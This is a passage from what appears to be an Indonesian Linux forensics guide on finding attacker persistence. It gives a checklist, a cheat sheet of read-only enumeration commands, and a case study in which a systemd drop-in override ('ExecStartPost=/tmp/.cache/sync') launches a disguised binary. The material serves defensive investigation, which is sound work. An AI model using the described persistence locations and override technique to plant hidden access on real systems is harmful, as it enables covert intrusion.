| SSH (`command=`, `ForceCommand`, `sshrc`) | Cek `authorized_keys`, `sshd_config`, `~/.ssh/rc` | Tidak | §6.6.4 |
| `/etc/ld.so.preload` | `cat /etc/ld.so.preload` | Tidak | §6.7.2 |
| LD_PRELOAD env variable | Cek shell/unit/live proses — **tersebar, cek semua** | Tidak ada file tunggal | §6.7.2 |
| `ld.so.conf.d` hijacking | `cat /etc/ld.so.conf.d/*.conf` | Tidak | §6.7.3 |
| udev rules | `grep RUN+= /etc/udev/rules.d/` | Tidak | §6.8 |
| XDG autostart | Cek `~/.config/autostart/`, `/etc/xdg/autostart/` | Tidak | §6.8 |

> 💡 **Cara pakai tabel ini:** Dipakai sebagai **master checklist** — jalankan tiap baris secara berurutan (sesuai urutan §6.2), centang yang sudah dicek, jangan berhenti di baris pertama yang memberi hasil positif karena mekanisme lain bisa berjalan **paralel** (attacker sering pasang lebih dari satu persistence sebagai redundansi).

---

### 6.10 Ringkasan Command & Tools Cheat Sheet

```bash
# ===== CRON =====
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
for u in $(cut -f1 -d: /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null; done
cat /etc/anacrontab
atq
cat -A /etc/crontab    # cek hidden character

# ===== SYSTEMD — ENUMERASI & STATE =====
systemctl list-unit-files --type=service
systemctl list-unit-files --type=timer
systemctl list-timers --all
systemctl list-units --type=socket,path
systemctl is-enabled <unit>
systemctl status <unit>
systemctl cat <unit>              # termasuk drop-in override

# ===== SYSTEMD — LOKASI & GENERATOR =====
ls -la /etc/systemd/system/ /run/systemd/system/ /usr/lib/systemd/system/
for home in /home/*; do sudo -u "$(basename "$home")" systemctl --user list-unit-files 2>/dev/null; done
ls -la /usr/lib/systemd/system-generators/ /run/systemd/generator/

# ===== SYSTEMD — CROSS-REFERENCE =====
journalctl -u <unit> --no-pager
grep -r "ExecStart\|EnvironmentFile" /etc/systemd/system/*.service

# ===== INIT SCRIPT (SYSV) =====
ls -la /etc/init.d/
ls -la /etc/rc2.d/ /etc/rc3.d/ /etc/rc5.d/
cat /etc/init.d/<nama_script>

# ===== SHELL & LOGIN =====
for home in /home/* /root; do
    grep -viE "^#|^$" "$home/.bashrc" "$home/.profile" 2>/dev/null
done
cat /etc/profile.d/*.sh
grep -r "pam_exec" /etc/pam.d/
grep "command=" /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null
grep -i "ForceCommand" /etc/ssh/sshd_config
find /home /root -path "*/.ssh/rc" 2>/dev/null

# ===== LD_PRELOAD & DYNAMIC LINKER =====
cat /etc/ld.so.preload
grep -r "LD_PRELOAD" /home/*/.bashrc /etc/systemd/system/*.service /etc/environment 2>/dev/null
cat /etc/ld.so.conf.d/*.conf
ldconfig -p | less
sudo find / -perm -4000 -o -perm -2000 2>/dev/null    # setuid/setgid binary

# ===== LAINNYA =====
grep -r "RUN+=" /etc/udev/rules.d/
cat /etc/xdg/autostart/*.desktop 2>/dev/null
cat /etc/apt/apt.conf.d/* 2>/dev/null | grep -i "invoke"

# ===== PRINSIP UMUM — OWNER/PERMISSION/TIMESTAMP UNTUK ARTEFAK APAPUN =====
stat <path_artefak>
sudo find <direktori> -newer /etc/hostname -exec stat {} \;
```

---

### 6.11 Mini Case Study — Workflow Analisa End-to-End

Skenario: server Ubuntu dicurigai terkompromi, dilaporkan mengirim traffic keluar mencurigakan secara periodik meski tidak ada proses "aneh" yang terlihat di `ps aux` saat investigator login.

```
Langkah 1 — Ikuti urutan enumerasi §6.2, mulai dari cron
   cat /etc/crontab && cat /etc/cron.d/*
   → NIHIL, tidak ada entry mencurigakan

Langkah 2 — Loop crontab per-user (checklist §6.3.3, sering terlewat)
   for u in $(cut -f1 -d: /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null; done
   → NIHIL juga

Langkah 3 — Lanjut ke systemd (§6.4), enumerasi unit
   systemctl list-unit-files --type=service | grep enabled
   → Ditemukan: "net-healthcheck.service" — enabled, nama terlihat legit

Langkah 4 — Cek konfigurasi EFEKTIF (§6.4.8, WAJIB pakai systemctl cat bukan cat biasa)
   systemctl cat net-healthcheck.service
   → ExecStart=/usr/local/bin/healthcheck.sh
   → ADA drop-in override: net-healthcheck.service.d/99-override.conf
     berisi: ExecStartPost=/tmp/.cache/sync

Langkah 5 — Terapkan Prinsip Umum §6.2 ke kedua file yang dirujuk
   stat /usr/local/bin/healthcheck.sh        → dimiliki root, mtime 8 bulan lalu (WAJAR, lama)
   stat /tmp/.cache/sync                      → dimiliki root, mtime KEMARIN (MENCURIGAKAN)
   file /tmp/.cache/sync                       → ELF 64-bit executable (BUKAN script — janggal
                                                   untuk nama file yang terlihat seperti cache biasa)

Langkah 6 — Ikuti workflow §6.4.9 (ExecStart ke File Timeline)
   journalctl -u net-healthcheck.service --no-pager
   → Log menunjukkan service restart berkali-kali dalam interval singkat, konsisten
     dengan traffic periodik yang dilaporkan

Langkah 7 — Cek proses & jaringan (sistem live)
   ps aux | grep sync
   → Proses "sync" ternyata SEDANG BERJALAN tapi menyamar dengan nama generik,
     luput dari pemeriksaan visual awal investigator karena nama mirip proses sistem legit
   ss -tulpn | grep <PID>
   → Konfirmasi koneksi keluar periodik ke IP eksternal, cocok dengan interval restart di log

Langkah 8 — Root cause: bagaimana drop-in override ini bisa muncul?
   stat /etc/systemd/system/net-healthcheck.service.d/99-override.conf
   → mtime SAMA PERSIS dengan mtime /tmp/.cache/sync (dibuat di waktu yang sama)
   → Korelasikan ke auth.log/journal (Bab 3) di sekitar waktu tsb — ditemukan login SSH
     dari IP asing tepat sebelum kedua file ini dibuat

KESIMPULAN:
Attacker mendapat akses awal via SSH (root cause di luar scope Bab 6, lihat Bab 3/4),
lalu memasang persistence dengan teknik DROP-IN OVERRIDE (§6.4.8) terhadap service
legitimate "net-healthcheck.service" yang SUDAH ADA — bukan membuat unit baru dari nol
(yang lebih mudah terdeteksi lewat `systemctl list-unit-files`). Payload sebenarnya
(/tmp/.cache/sync) disamarkan dengan nama generik dan diletakkan di direktori staging
umum (Bab 1 §1.2.6). Investigasi awal yang cuma mengecek "unit file baru" hampir
melewatkan ini sepenuhnya — kunci penemuan ada di kebiasaan SELALU memakai
`systemctl cat` (bukan `cat` langsung) untuk melihat konfigurasi efektif termasuk
drop-in override.
```

> 💡 **Pelajaran utama studi kasus ini:** Persistence yang paling sulit ditemukan bukan yang membuat artefak baru mencolok, melainkan yang **menumpang** infrastruktur legitimate yang sudah ada (service resmi + drop-in override, §6.4.8) — checklist §6.9 dan kebiasaan menerapkan Prinsip Umum §6.2 secara konsisten (bukan cuma sekali di awal) adalah pertahanan paling efektif terhadap pola seperti ini.
